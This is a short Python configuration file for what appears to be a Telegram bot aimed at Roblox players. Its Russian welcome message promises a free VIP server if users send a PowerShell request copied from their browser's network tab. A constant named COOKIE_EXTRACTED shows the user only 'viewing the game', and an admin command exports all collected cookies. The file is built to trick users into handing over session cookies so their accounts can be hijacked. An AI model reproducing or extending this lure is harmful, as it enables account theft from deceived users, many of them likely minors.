import os
from dotenv import load_dotenv

load_dotenv()

class Config:
    BOT_TOKEN = os.getenv("BOT_TOKEN")
    ADMIN_ID = int(os.getenv('ADMIN_ID', 0))
    DB_PATH = 'database.db'
    
    # Сообщения
    WELCOME_MESSAGE = """
🤖 *Бот для получения бесплатной випки в Roblox*

Отправьте мне PowerShell скрипт с игрой (текст из Network).

    """
    
    COOKIE_EXTRACTED = """
✅ *Просматриваю игру...*

    """
    
    ADMIN_COMMANDS = """
👑 *Админ-команды:*

📊 /stats - Статистика пользователей
👥 /users - Список всех пользователей
📢 /broadcast - Рассылка всем пользователям
🗑 /delete [id] - Удалить пользователя
📥 /export - Экспорт всех куки
    """
